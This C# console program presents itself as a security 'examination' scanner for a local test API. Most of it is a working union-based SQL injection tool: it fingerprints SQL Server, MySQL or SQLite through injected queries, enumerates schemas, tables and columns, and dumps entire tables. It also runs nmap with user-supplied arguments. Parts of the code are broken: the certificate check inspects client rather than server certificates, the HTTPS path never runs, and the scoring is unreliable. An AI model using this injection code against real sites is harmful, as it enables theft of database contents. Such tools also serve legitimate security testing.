using System.Net;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Vizsgalo
{
    public class Scanner
    {
        private static string _baseResponse = ""; // this is the base response which makes the base query (for comparing with the injected results later)
        private static string _latestResponse = ""; // a string variable which contains the latest response result
        
        private static readonly string AsterisksSeparator = new string('*', Console.WindowWidth);
        private const string UnionStart = "'' OR 1=1 UNION SELECT ";
        private static int _unionNumber; // it represents how many plus columns we need to write in the union selects
        private static string _unionColumnsString = ""; // it represents the union columns (the default value is "" aka no extra column)
        private static string _db = "";
        private static string _dbVersion = "";
        private const string IsSqlServerOrMySql = "@@version;--";
        private const string IsSqlite = "sqlite_version();--";

        private static HttpClient _httpClient = new()
        {
            BaseAddress = new Uri("http://localhost:5227/Users")
        };

        public static async Task Main()
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Examination started\n");
            Console.ResetColor();
            
            await StartExamination(_httpClient);
            
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Examination finished");
            Console.ResetColor();
        }
        
        // sends a GET request to the given url and writes the responses to the console
        static async Task StartExamination(HttpClient httpClient)
        {
            SetEndpoint(httpClient);
            string[] parameters = GetQueryParameters();
            string firstParameter = parameters[0];

            await GetBaseResponse(httpClient, firstParameter);

            await SetupUnionAndDatabase(httpClient, firstParameter);

            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("\nSuccess, " + _db + " is used, database version: " + _dbVersion);
            Console.WriteLine("Number of extra columns: " + _unionNumber + ", the union section of the query string: " +
                              _unionColumnsString);
            Console.ResetColor();

            // execute the commands given by the user (the options are specified below)
            ConsoleKeyInfo key;
            do
            {
                PrintCommandList();
                key = Console.ReadKey();
                Console.WriteLine();

                switch (key.Key)
                {
                    // OPTION 1: get all schema names in the current database
                    case ConsoleKey.D1:
                        await HandleAllSchemas(httpClient, firstParameter);
                        break;

                    // OPTION 2: get all table names in the given schema
                    case ConsoleKey.D2:
                        await HandleTablesInSchema(httpClient, firstParameter);
                        break;

                    // OPTION 3: get the given table's schema
                    case ConsoleKey.D3:
                        await HandleTableSchemas(httpClient, firstParameter);
                        break;

                    // OPTION 4: get all data from a specific database column
                    case ConsoleKey.D4:
                        await HandleDataFromColumn(httpClient, firstParameter);
                        break;

                    // OPTION 5: get all data from the given database
                    case ConsoleKey.D5:
                        await HandleAllDataFromTable(httpClient, firstParameter);
                        break;

                    // OPTION 6: scan for open ports
                    case ConsoleKey.D6:
                        HandlePortScanning();
                        break;

                    // OPTION 7: check the validity of the server's certificate
                    case ConsoleKey.D7:
                        HandleCertificateCheck(httpClient);
                        break;

                    // OPTION 8: change target endpoint
                    case ConsoleKey.D8:
                        SetEndpoint(httpClient); //TODO
                        break;

                    // OPTION 9: run a full analysis and calculate a score
                    case ConsoleKey.D9:
                        await HandleFullAnalysis(httpClient, firstParameter);
                        break;
                }
            } while (key.Key != ConsoleKey.D0); // if the 0 button is pressed then the examination finishes
        }
        
        /* ----------------------------------------- Key event handlers --------------------------------------------- */
        static async Task HandleAllSchemas(HttpClient httpClient, string firstParameter)
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nAll schemas in the current database:");
            Console.ResetColor();
            await GetAllSchemaNames(httpClient, firstParameter);
        }

        static async Task HandleTablesInSchema(HttpClient httpClient, string firstParameter)
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("\nEnter the name of the schema:");
            Console.ResetColor();
            string schemaName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (schemaName != "")
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("\nAll tables in the given database:");
                Console.ResetColor();
                await GetTableNamesInSchema(httpClient, schemaName, firstParameter);
            }
        }

        static async Task HandleTableSchemas(HttpClient httpClient, string firstParameter)
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("\nEnter the name of the table:");
            Console.ResetColor();
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "")
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("\nThe given table's schema:");
                Console.ResetColor();
                await GetTableColumns(httpClient, tableName, firstParameter);
            }
        }

        static async Task HandleDataFromColumn(HttpClient httpClient, string firstParameter)
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("\nEnter the name of the table:");
            Console.ResetColor();
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("\nEnter the name of the column:");
            Console.ResetColor();
            string columnName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "" && columnName != "")
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("\nGetting all data from table " + tableName + " from column " +
                                  columnName);
                Console.ResetColor();
                await GetDataFromTableColumn(httpClient, tableName, columnName, firstParameter);
            }
        }

        static async Task HandleAllDataFromTable(HttpClient httpClient, string firstParameter)
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("\nEnter the name of the database:");
            Console.ResetColor();
            string tableName = Console.ReadLine() ?? "";
            Console.WriteLine();
            if (tableName != "")
            {
                await GetAllDataFromTable(httpClient, tableName, firstParameter);
            }
        }

        static void HandlePortScanning()
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("\nEnter the server's IP address:");
            Console.ResetColor();
            string address = Console.ReadLine() ?? "";
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("\nEnter the nmap arguments:");
            Console.ResetColor();
            string pars = Console.ReadLine() ?? "";
            string args = pars + " " + address;
            Console.WriteLine();
            if (args != " ")
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("Scanning " + address + " with these parameters: " + pars);
                Console.ResetColor();
                string result = ScanForOperPorts(args);
                Console.WriteLine(result);
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Number of open ports: " + Regex.Matches(result, "open").Count);
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine("Invalid parameters!");
            }
        }

        static void HandleCertificateCheck(HttpClient httpClient)
        {
            string address = httpClient.BaseAddress != null
                ? httpClient.BaseAddress.ToString()
                : "localhost";
            if (address.Contains("http"))
            {
                CheckCertificateHttp(address);
            }
            else if (address.Contains("https"))
            {
                CheckCertificateHttps(address);
            }
            else
            {
                string httpAddress = "http://" + address;
                CheckCertificateHttp(httpAddress);
            }
        }

        static async Task HandleFullAnalysis(HttpClient httpClient, string firstParameter)
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nRunning full analysis on the target site...");
            Console.ResetColor();
            await RunFullAnalysis(httpClient, firstParameter);
        }
        /* ---------------------------------------------------------------------------------------------------------- */
        

        // sets the endpoint given by the user
        static void SetEndpoint(HttpClient httpClient)
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("Enter the endpoint of the target URL (e.g. /Sqlserver/");
            Console.ResetColor();
            string endPoint = Console.ReadLine() ?? "/Sqlserver/";
            if (endPoint == "")
            {
                endPoint = "/Sqlserver/";
            }
            httpClient.BaseAddress = new Uri(httpClient.BaseAddress + endPoint);
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("Total base address: " + httpClient.BaseAddress);
            Console.ResetColor();
        }

        // gets the URL query parameters from the user
        static string[] GetQueryParameters()
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("Enter the query string parameters (separated with ; characters):");
            Console.ResetColor();
            string paramsString = Console.ReadLine() ?? "";
            
            return paramsString.Split(";");
        }

        // gets the base response which is returned to the base injected query (for result filtering)
        static async Task GetBaseResponse(HttpClient httpClient, string firstParameter)
        {
            // gets the base response
            HttpResponseMessage baseResponse = await httpClient.GetAsync("?" + firstParameter + "=" + "'' OR 1=1;--");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nRequest:");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(baseResponse.RequestMessage);
            Console.ResetColor();
            var jsonBaseResponse = await baseResponse.Content.ReadAsStringAsync();
            _baseResponse = jsonBaseResponse;
        }

        // determines the number of union columns and that which database is used
        static async Task SetupUnionAndDatabase(HttpClient httpClient, string firstParameter)
        {
            HttpResponseMessage unionResponse;
            string unionUrlBase = "?" + firstParameter + "=" + UnionStart;
            
            do
            {
                _unionNumber++;
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine(_unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
                
                _unionColumnsString = _unionColumnsString == "" ? "'1'" : _unionColumnsString + ",'1'";
                string unionSqlServerOrMySql = unionUrlBase + _unionColumnsString + ", " + IsSqlServerOrMySql;
                Console.WriteLine("Checking for SQL Server or MySql first...");
                Console.ResetColor();
                
                unionResponse = await httpClient.GetAsync(unionSqlServerOrMySql);
                Console.WriteLine(unionResponse.RequestMessage);
                var jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                Console.ForegroundColor = unionResponse.StatusCode == HttpStatusCode.OK ? ConsoleColor.DarkGreen : ConsoleColor.Red;
                Console.WriteLine("Status code: " + unionResponse.StatusCode);
                Console.ResetColor();

                if (unionResponse.StatusCode != HttpStatusCode.OK) // if it wasn't SQL Server or MySql then it checks for SQLite
                {
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.WriteLine("Checking for SQLite...");
                    Console.ResetColor();
                    string unionSqlite = unionUrlBase + _unionColumnsString + ", " + IsSqlite;
                    unionResponse = await httpClient.GetAsync(unionSqlite);
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.WriteLine("\nRequest:");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.WriteLine(unionResponse.RequestMessage);
                    Console.ResetColor();
                    jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                    Console.ForegroundColor = unionResponse.StatusCode == HttpStatusCode.OK ? ConsoleColor.DarkGreen : ConsoleColor.Red;
                    Console.WriteLine("Status code: " + unionResponse.StatusCode);
                    Console.ResetColor();

                    if (unionResponse.StatusCode == HttpStatusCode.OK)
                    {
                        _db = "sqlite";
                        _dbVersion = jsonUnionResponse.Contains("sqlite3") || jsonUnionResponse.Contains("3.4") ? "3.4" : "old-sqlite";
                    }
                }
                // else it checks whether it is SQL Server or MySql
                else 
                {
                    if (jsonUnionResponse.Contains("Microsoft SQL Server"))
                    {
                        _db = "sqlserver";
                        _dbVersion = jsonUnionResponse.Split("Microsoft SQL Server")[1].Split(" - ")[1].Split(")")[0] + ")";
                    }
                    else
                    {
                        _db = "mysql";
                        _dbVersion = jsonUnionResponse.Split("MariaDB")[0] + "MariaDB";
                    }
                }
            } while (unionResponse.StatusCode != HttpStatusCode.OK);
        }

        static void PrintCommandList()
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine();
            Console.WriteLine(AsterisksSeparator);
                
            Console.WriteLine("Select an operation to be executed by the application");
                
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\nDATABASE OPERATIONS");
            Console.WriteLine("> Press '1' to get all schema names in the current database");
            Console.WriteLine("> Press '2' to get all table names in the given schema");
            Console.WriteLine("> Press '3' to get the given table's schema");
            Console.WriteLine("> Press '4' to get all data from a specific database column");
            Console.WriteLine("> Press '5' to get all data from the given database");
                
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\nNETWORK AND SERVER OPERATIONS");
            Console.WriteLine("> Press '6' to scan the server for open ports");
            Console.WriteLine("> Press '7' to check the validity of the server's certificate");
                
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("\nCHANGE SETTINGS");
            Console.WriteLine("> Press '8' to change target endpoint");
                
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\nFULL ANALYSIS");
            Console.WriteLine("> Press '9' to run a full analysis and read results");

            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("\n> Press '0' to escape (finish) the examination");
            Console.WriteLine(AsterisksSeparator);
            
            Console.ResetColor();
        }

        
        // starts the full automatic analysis
        static async Task RunFullAnalysis(HttpClient httpClient, string firstQueryParameter)
        {
            /*
             Full analysis:
                1. get table names, query the first (get all data) -> sql injection score
                    - if it's not possible to get table schema -> 0.5
                    - if it's possible to get table schema but not the data -> 0.25
                    - if it's possible to get every information -> 0
                2. scan for open ports -> ports score
                    - if the number of open ports is lower or equal than 10 -> 1
                    - else 0
                3. check certificate -> certificate score
                    - if the number of valid certificates is at least 1 -> 1
                    - else 0
                4. score summary
                    prints summaries by processes and a full score:
                    full score = (injection + ports + certificate) / 3
            */

            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Starting auto analysis...");
            Console.ForegroundColor = ConsoleColor.DarkCyan;

            // PROCESS 1: test sql injection
            double sqlInjectionScore = await AutoTestSqlInjection(httpClient, firstQueryParameter); // it starts from 0.5 if it got here (the app got the db and the union select with SQL injections)

            // PROCESS 2: test open ports
            double portsScore = AutoTestPorts();

            // PROCESS 3: test certificates
            double certificateScore = AutoTestCertificates(httpClient);
            
            
            /* SUMMARIES */
            DisplaySummariesByProcesses(sqlInjectionScore, portsScore, certificateScore);

            double fullScore = (sqlInjectionScore + portsScore + certificateScore) / 3;
            DisplayOverallSummary(fullScore);
        }

        static async Task<double> AutoTestSqlInjection(HttpClient httpClient, string firstQueryParameter)
        {
            // STEP 1: get table schemas
            await GetAllSchemaNames(httpClient, firstQueryParameter);
            string[] response = _latestResponse.Split(" | ");
            if (response.Length > 0)
            {
                // STEP 2: get table names in the first schema
                await GetTableNamesInSchema(httpClient, response[0], firstQueryParameter);
                response = _latestResponse.Split(" | ");
                if (response.Length > 0)
                {
                    // STEP 3: get all data from the first table
                    await GetAllDataFromTable(httpClient, response[0], firstQueryParameter);
                    response = _latestResponse.Split(" | ");
                    if (response.Length > 0)
                    {
                        return 0;
                    }
                    
                    return 0.25;
                }
            }
            
            return 0.5;
        }

        static double AutoTestPorts()
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Scanning for open ports...");
            string result = ScanForOperPorts("");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(result);
            Console.ForegroundColor = ConsoleColor.Yellow;
            int openPorts = Regex.Matches(result, "open").Count;
            Console.WriteLine("Number of open ports: " + openPorts);
            
            return openPorts > 10 ? 0 : 1;
        }

        static double AutoTestCertificates(HttpClient httpClient)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Checking server certificates...");
            HandleCertificateCheck(httpClient);
            string[] response = _latestResponse.Split(" | ");
            
            return response.Length == 0 ? 0 : 1;
        }

        
        // displays summaries by processes at the end of the automatic analysis
        static void DisplaySummariesByProcesses(double sqlInjectionScore, double portsScore, double certificateScore)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("\nFull analysis finished! Results by categories:");
            
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nSQL injection score:");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(
                AreEqual(sqlInjectionScore, 0.5) ?
                    "It was possible to perform an SQL injection, but could not get any data from the database. Medium security." :
                    AreEqual(sqlInjectionScore, 0.25) ?
                        "It was possible to get all database schemas and the tables in them, but could not get any data from the tables. Low security." :
                        "It was possible to retrieve all data from the database. Zero security."
            );
            
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nPorts score:");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(
                AreEqual(portsScore, 1.0) ?
                    "The total number of open ports is not higher than 10. Optimal security.":
                    "The total number of open ports is higher than 10. Low security."
            );
            
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nCertificates score:");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(
                AreEqual(certificateScore, 1.0) ?
                    "There is at least 1 valid certificate. Optimal security.":
                    "There are no valid certificates. Zero security."
            );
        }

        // displays the overall summary at the end of the automatic analysis
        static void DisplayOverallSummary(double fullScore)
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nOverall score:");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(Math.Round(fullScore, 2) * 100 + "%");
        }
        
        
        /* INDIVIDUAL TASKS */
        static async Task GetAllSchemaNames(HttpClient httpClient, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver")
            {
                 url += "schema_name(t.schema_id) FROM sys.tables t;--";
            } else if (_db == "mysql")
            {
                url += "schema_name FROM information_schema.schemata;--";
            } else if (_db == "sqlite")
            {
                //TODO
            }
            
            // sends GET request to server
            await GetRequest(httpClient, url);
        }
        
        static async Task GetTableNamesInSchema(HttpClient httpClient, string schemaName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver")
            {
                url += "t.name FROM sys.tables t where schema_name(t.schema_id) = '" + schemaName + "';--";
            } else if (_db == "mysql")
            {
                url += "table_name FROM information_schema.tables where table_schema = '" + schemaName + "';--";
            } else if (_db == "sqlite")
            {
                url += "name FROM sqlite_schema where type = 'table';--";
            }
            
            // sends GET request to server
            await GetRequest(httpClient, url);
        }
        
        static async Task GetTableColumns(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
            if (_db == "sqlserver" || _db == "mysql")
            {
                url += "COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + tableName + "';--";
            } else if (_db == "sqlite")
            {
                url += "name FROM pragma_table_info('" + tableName + "');--";
            }
            
            // sends GET request to server
            await GetRequest(httpClient, url);
        }
        
        static async Task GetDataFromTableColumn(HttpClient httpClient, string tableName, string columnName, string firstQueryParameter)
        { 
            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", " + columnName + " FROM " + tableName + ";--";
            // sends GET request to server
            Console.WriteLine("Getting all data using " + _db + "...");
            await GetRequest(httpClient, url);
        }
        
        static async Task GetAllDataFromTable(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            Console.WriteLine("Getting all data using " + _db + "...");

            await GetTableColumns(httpClient, tableName, firstQueryParameter);
            string[] columnNames = _latestResponse.Split(" | ");

            for (int i = 0; i < columnNames.Length; i++)
            {
                await GetDataFromTableColumn(httpClient, tableName, columnNames[i], firstQueryParameter);
            }
        }

        static string ScanForOperPorts(string arguments)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\nScanning in progress...");
            Console.ResetColor();
            string nmapPath = "C:\\Program Files (x86)\\Nmap\\nmap.exe";
            string result;
            
            using (Process process = new Process())
            {
                process.StartInfo.FileName = nmapPath;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                using (StreamReader reader = process.StandardOutput)
                {
                    result = reader.ReadToEnd();
                }

                process.WaitForExit();
            }
            
            return result;
        }

        static void CheckCertificateHttp(string address)
        {
            try
            {
                using (HttpClientHandler handler = new HttpClientHandler())
                {
                    using (HttpClient client = new HttpClient(handler))
                    {
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine($"Checking {address} for any certificates...");
                        Console.ResetColor();
                        HttpResponseMessage response = client.GetAsync(address).Result;

                        if (response.IsSuccessStatusCode)
                        {
                            // Server certificate information can be accessed here
                            var certificates = handler.ClientCertificates;

                            if(certificates.Count == 0)
                            {
                                Console.WriteLine("\nThe server did not provide any certificates.");
                                _latestResponse = "";
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.WriteLine("\nThe server provides these certificates:");
                                List<string> certificatesList = new List<string>();
                                for (int i = 0; i < certificates.Count; i++)
                                {
                                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                                    string expirationDate = certificates[i].GetExpirationDateString();

                                    string certificateResult =
                                        $"\nCertificate #{i + 1}: {certificates[i]}\nExpiration date: {expirationDate}";
                                    certificatesList.Add(certificateResult);
                                    Console.WriteLine(certificateResult);
                                }

                                _latestResponse = string.Join(" | ", certificatesList);
                            }
                        }
                        else
                        {
                            Console.WriteLine($"HTTP request failed with status code: {response.StatusCode}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
        
        static void CheckCertificateHttps(string address)
        {
        }
        
        
        
        static async Task GetRequest(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nRequest:");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(response.RequestMessage);
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("\nResponse:");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            string filteredResponse = FilterResponse(jsonResponse);
            _latestResponse = filteredResponse;
            Console.WriteLine($"{filteredResponse}\n");
            Console.ResetColor();
        }


        static string FilterResponse(string fullResponse)
        {
            return FilterTableData(GetMiddleSubstring(_baseResponse, fullResponse));
        }
        
        static string GetMiddleSubstring(string first, string second)
        {
            // finds the common prefix
            int commonPrefixLength = 0;
            while (commonPrefixLength < first.Length && commonPrefixLength < second.Length && first[commonPrefixLength] == second[commonPrefixLength])
            {
                commonPrefixLength++;
            }

            // finds the common suffix
            int commonSuffixLength = 0;
            while (commonSuffixLength < first.Length - commonPrefixLength
                   && commonSuffixLength < second.Length - commonPrefixLength
                   && first[first.Length - commonSuffixLength - 1] == second[second.Length - commonSuffixLength - 1])
            {
                commonSuffixLength++;
            }

            // extracts the middle substring
            int middleStart = commonPrefixLength;
            int middleLength = second.Length - commonPrefixLength - commonSuffixLength;

            if (middleLength > 0)
            {
                return second.Substring(middleStart, middleLength);
            }

            return ""; // If no middle substring found
        }

        static string FilterTableData(string rawData)
        {
            //Console.WriteLine(rawData);
            if (!rawData.Contains("td"))
            {
                return rawData;
            }

            string[] fields = 
                rawData
                    .Replace("</", String.Empty)
                    .Replace("/>", String.Empty)
                    .Replace("<", String.Empty)
                    .Replace(">", String.Empty)
                    .Replace("tr", String.Empty)
                    .Replace(" ", String.Empty)
                    .Split("td");
            var finalFields = new List<string>();
            for (int i = 0; i < fields.Length; i++)
            {
                if (!string.IsNullOrWhiteSpace(fields[i]) && !fields[i].Equals("1"))
                {
                    finalFields.Add(WebUtility.HtmlDecode(fields[i]));
                }
            }
            return string.Join(" | ", finalFields.ToArray());
        }
        
        // checks equality between two double values
        static bool AreEqual(double var1, double var2, double tolerance = 0.0001)
        {
            return Math.Abs(var1 - var2) < tolerance;
        }
    }
}